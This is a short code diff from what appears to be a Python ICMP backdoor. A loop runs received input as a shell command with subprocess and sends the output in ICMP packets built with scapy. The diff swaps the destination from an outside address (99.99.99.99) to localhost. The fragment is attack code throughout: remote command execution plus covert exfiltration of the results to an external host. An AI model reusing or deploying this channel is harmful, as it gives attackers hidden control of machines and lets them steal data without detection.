@@ -12,5 +12,5 @@ while 1:
 		c=subprocess.Popen(str(res),stdout=subprocess.PIPE)
 		s=c.communicate()
 		time.sleep(1)
-		send(IP(src="127.0.0.1",dst="99.99.99.99")/ICMP()/str(s))
+		send(IP(src="127.0.0.1",dst="127.0.0.1")/ICMP()/str(s))
 
